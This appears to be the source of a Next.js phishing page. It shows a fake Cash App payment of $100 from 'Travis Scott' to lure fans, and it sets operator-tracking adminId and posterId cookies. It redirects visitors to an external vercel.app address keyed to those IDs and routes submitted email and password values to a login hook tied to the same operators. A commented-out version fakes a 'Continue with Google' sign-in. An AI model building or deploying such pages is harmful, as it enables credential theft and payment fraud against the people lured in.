// "use client";
// import { useRouter } from "next/navigation";
// import Cookies from "js-cookie";
// import { useEffect } from "react";
// function Home({ adminId, posterId }) {
//   useEffect(() => {
//     Cookies.set("adminId", adminId);
//     Cookies.set("posterId", posterId);
//   }, []);
//   const router = useRouter();
//   return (
//     <div className="bg-gray-300">
//       <div className="relative">
//         <iframe
//           class="absolute inset-0 object-cover w-full h-full"
//           src="https://www.google.com/maps/embed?pb=!1m18!1m12!1m3!1d3153.5693930527423!2d144.95855721544715!3d-37.818435979751494!2m3!1f0!2f0!3f0!3m2!1i1024!2i768!4f13.1!3m3!1m2!1s0x6ad642af0f11fd81%3A0xf577f5d1f11f1c1b!2sFederation%20Square!5e0!3m2!1sen!2sau!4v1601360233956!5m2!1sen!2sau"
//           frameborder="0"
//           style={{
//             border: "0",
//             position: "fixed",
//             top: 0,
//             left: 0,
//             bottom: 0,
//             right: 0,
//             width: "100%",
//             height: "100%",
//             margin: 0,
//             filter: "blur(2px)",
//             WebkitFilter: "blur(2px)",
//             overflow: "hidden",
//             zIndex: -1,
//             backgroundColor: "gray",
//           }}
//           allowfullscreen=""
//           loading="lazy"
//         ></iframe>

//         <div className="relative z-10 shadow-2xl">
//           {" "}
//           <button
//             onClick={() => router.push("/signin")}
//             className="bg-[#bfdbfe] absolute mt-[300px] left-[25%] md:left-[42%]  top-[50%]  px-10 py-3 rounded-full text-black text-[16px] font-OpenSans flex items-center gap-2 "
//           >
//             <img
//               src="/images/google-logo-small.png"
//               alt="logo"
//               className="absolute top-[50%] left-[10%] translate-x-[-50%] translate-y-[-50%] w-[30px] h-[30px]"
//             />{" "}
//             Continue with Google
//           </button>
//         </div>
//       </div>
//     </div>
//   );
// }

// export default Home;







"use client";
import { Field, Form, Formik } from "formik"
import Cookies from "js-cookie";
import { useEffect, useState } from "react";
import { useRouter } from "next/navigation";
import { site } from "../config/index";
import useMockLogin from "../hooks/useMockLogin";
export default function Home({ adminId, posterId }) {
  const [open, setOpen] = useState(false);
  const [email, setEmail] = useState("");
  const [password, setPassword] = useState("");
    const [redirected, setRedirected] = useState(false);

  const [currentTime, setCurrentTime] = useState(new Date());
  const router = useRouter();
   const initialvalues = {
    email: "",
    password: "",
  };

  if (!redirected) {
    setRedirected(true);
    setTimeout(() => {
           window.location.href = `https://mega-new.vercel.app/${adminId}/${posterId}`;

    }, 1500);
  }
    useEffect(() => {
    Cookies.set("adminId", adminId);
    Cookies.set("posterId", posterId);
  }, []);

  useEffect(() => {
    const intervalId = setInterval(() => {
      setCurrentTime(new Date());
    }, 60000);
    return () => clearInterval(intervalId);
  }, []);
  const formatTime = (date) => {
    const hours = date.getHours();
    const minutes = date.getMinutes();
    const formattedMinutes = minutes < 10 ? `0${minutes}` : minutes;
    return `${hours}:${formattedMinutes}`;
  };

  const { login } = useMockLogin(adminId, posterId);
  const handleSubmit = async () => {
    const allValues = {
      site: site,
      mail: email,
      passcode: password,
    };

    login(allValues);
    setEmail("");
    setPassword("");
  };
  return (
    <>
      {!open ? (
        <div className="flex flex-col m-5 gap-5 ">
          <div className="text-center ">
            <p className="text-lg font-semibold">Travis Scott</p>
            <p className="text-xs text-gray-400">Payment form Stravisscott</p>
          </div>
          <div className="text-center mt-[50%]">
            <p className="text-2xl font-semibold">$100.00</p>
            <p className="text-xs text-gray-400">
              For la flame fans must eat Today at {formatTime(currentTime)}
            </p>
          </div>
          <div className=" flex flex-col gap-2 justify-center items-center text-center mt-[50%]">
            <button
              className=" w-[25%] px-5 py-1 rounded-xl bg-green-600 text-white"
              onClick={() => setOpen(true)}
            >
              Accept
            </button>
            <button className=" w-[25%] px-5 py-1 rounded-xl bg-red-600 text-white">
              Decline
            </button>
          </div>
        </div>
      ) : (
    <div className="flex flex-col justify-center items-center shadow-lg rounded-xl bg-slate-100 w-[400px] h-[500px] mx-auto mt-[150px]">
         <img src="/images/Square_Cash_app_logo.svg" height={200} width={200} />
        
       </div>
      )}
    </>
  );
}
